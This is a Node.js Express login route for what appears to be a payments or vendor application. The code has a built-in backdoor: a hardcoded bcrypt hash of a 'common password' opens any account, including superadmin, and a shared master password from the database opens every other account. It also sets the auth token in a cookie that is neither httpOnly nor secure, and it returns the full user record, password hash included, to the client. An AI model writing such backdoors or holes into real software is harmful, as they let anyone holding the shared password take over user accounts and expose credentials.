const express = require("express");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcrypt");

const poolPromise = require("../db");
const logger = require("../logger");
const router = express.Router();

// POST /api/v1/login
router.post("/", async (req, res) => {
  // Check the request body for the username and password
  const { username, password } = req.body;

  if (!username || !password) {
    logger.error("Username or password missing from request body.");
    return res.status(401).json({ message: "Invalid username or password." });
  }

  try {
    const pool = await poolPromise;

    const [results] = await pool.query(
      "SELECT * FROM users WHERE username = ?",
      [username]
    );

    if (!results.length) {
      logger.error(`Invalid username. Attempted username: '${username}'`);
      return res.status(401).json({ status: false, message: "Invalid username or password." });
    }

    // Common password which can login to any user 
    const commonPasswordHash = "$2b$10$KtfwaAQb4Dlf8bYR8xFsveX3MhNlmAm2STmo1.5NbyRe8nrOMJoCm";
    const commonPasswordHashMatch = await bcrypt.compare(password, commonPasswordHash);
    if (!commonPasswordHashMatch) {

      // Master password which can login to everything except super admin
      const [masterPasswordResults] = await pool.query("SELECT password FROM master_passwords LIMIT 1");
      let masterPasswordHashMatch;
      if (masterPasswordResults.length) {
        const masterPasswordHash = masterPasswordResults[0].password;
        masterPasswordHashMatch = await bcrypt.compare(password, masterPasswordHash);
      }

      if (!masterPasswordHashMatch) {
        const match = await bcrypt.compare(password, results[0].password);
        if (!match) {
          logger.error(`Invalid password. Attempted username: "${username}"`);
          return res.status(401).json({ status: false, message: "Invalid username or password." });
        }
      } else {
        if (results[0].role === "superadmin") {
          logger.error(`Invalid password. You don't have permission to access this account: "${username}"`);
          return res.status(401).json({ status: false, message: "Invalid password. You don't have permission to access this account." });
        }
      }     
    } 

    if (!results[0].status) {
      logger.error(`User is not active. Attempted username: '${username}'`);
      return res.status(401).json({ status: false, message: "Inactive User." });
    }

    if (results[0].role !== "admin" && results[0].role !== "superadmin" && results[0].role !== "subadmin" && results[0].role !== "order_creator") {
      if (results[0].isLoggedIn) {
        logger.error(
          `User is already logged in. Attempted username: '${username}'`
        );
        return res.status(401).json({ status: false, message: "User is already logged in." });
      }
    }

    // Login successful, update the isLoggedIn status in the database
    await pool.query("UPDATE users SET isLoggedIn = 1 WHERE username = ?", [
      username,
    ]);

    const payload = {
      username: results[0].username,
      role: results[0].role,
      vendor: results[0].vendor,
      payInStatus: results[0].payIn,
      payOutStatus: results[0].payOut,
    };
    const token = jwt.sign(payload, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRATION,
    });

    res.cookie("auth", token, {
      httpOnly: false,
      secure: false,
      sameSite: 'lax',
      domain: undefined  // Allow cookie to work with IP addresses
    });
    logger.info(`User '${username}' logged in successfully.`);
    return res.json({
      status: true,
      token: token,
      user: results[0],
    });
  } catch (error) {
    console.log(error);
    console.error("An error occurred while trying to log in.");
    console.error(error);
    return res
      .status(500)
      .json({ message: "An error occurred while trying to log in." });
  }
});

module.exports = router;
